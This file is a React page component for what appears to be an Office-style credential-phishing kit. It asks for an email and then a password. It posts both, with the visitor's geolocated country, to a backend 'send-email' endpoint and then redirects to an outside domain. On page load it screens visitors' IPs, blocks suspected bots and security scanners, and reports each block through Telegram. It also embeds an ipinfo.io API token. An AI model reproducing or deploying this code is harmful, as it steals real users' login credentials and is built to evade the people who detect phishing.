import { useState, useEffect } from 'react';
import axios from 'axios';
import styles from '../styles/Home.module.css';

export default function Home() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [country, setCountry] = useState('');
  const [emailSubmitted, setEmailSubmitted] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [accessDenied, setAccessDenied] = useState(false);

  useEffect(() => {
    // Trigger CloudFilt check on page load
    axios.get('/api/check-ip')
      .then(response => {
        if (response.data.listed) {
          console.warn('Suspicious IP detected:', response.data);
          setAccessDenied(true);
          // Notify via Telegram
          axios.post('/api/notify-telegram', {
            message: `🚨 Office Bot Eliminated 🚨\nIP: ${response.data.ip}\nISP: ${response.data.asnisp}`
          });
        }
      })
      .catch(error => {
        console.error('Error checking IP with CloudFilt:', error);
      });

    // Fetch user's country based on IP
    axios.get('https://ipinfo.io/json?token=c3e87e382ddea7')
      .then(response => {
        const countryCode = response.data.country;
        return axios.get(`https://restcountries.com/v3.1/alpha/${countryCode}`);
      })
      .then(countryResponse => {
        setCountry(countryResponse.data[0].name.common);
      })
      .catch(error => {
        console.error('Failed to fetch country:', error);
        setErrorMessage('Failed to retrieve country information.');
      });
  }, []);

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (validateEmail(email)) {
      setEmailSubmitted(true);
      setErrorMessage('');
    } else {
      setErrorMessage('Please enter a valid email address.');
    }
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();

    if (password.length >= 5) {
      setIsProcessing(true);
      try {
        await axios.post('/api/send-email', { email, password, country });
        window.location.href = 'https://ss.achemsite.info';
      } catch (error) {
        console.error('Failed to send email:', error);
        setErrorMessage('Failed to submit. Please try again.');
      } finally {
        setIsProcessing(false);
      }
    } else {
      setErrorMessage('Password must be at least 5 characters long.');
    }
  };

  const validateEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.toLowerCase());

  if (accessDenied) {
    return (
      <div className={styles.container}>
        <div className={styles.accessDeniedBox}>
          <h1>Access Denied</h1>
          <p>Your connection has been terminated due to suspicious activity.</p>
        </div>
      </div>
    );
  }

  return (
    <div className={styles.container}>
      <div className={styles.background}></div>
      <div className={styles.loginBox}>
        <img src="/logo.png" alt="Logo" className={styles.logo} />
        <div className={styles.message}>
          {emailSubmitted ? 'Validate email password to continue' : 'Verify email to proceed'}
        </div>
        {emailSubmitted ? (
          <>
            <div className={styles.displayEmail}>{email}</div>
            <form onSubmit={handlePasswordSubmit}>
              <input
                type="password"
                placeholder="Password"
                className={styles.inputField}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <div className={styles.buttonContainer}>
                <button type="submit" className={styles.submitButton}>Validate</button>
              </div>
            </form>
          </>
        ) : (
          <form onSubmit={handleEmailSubmit}>
            <input
              type="email"
              placeholder="Email Address"
              className={styles.inputField}
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <div className={styles.buttonContainer}>
              <button type="submit" className={styles.nextButton}>Next</button>
            </div>
          </form>
        )}
        {errorMessage && <div className={styles.errorMessage}>{errorMessage}</div>}
        {isProcessing && (
          <div className={styles.modal}>
            <div className={styles.modalContent}>
              <p>Processing...</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
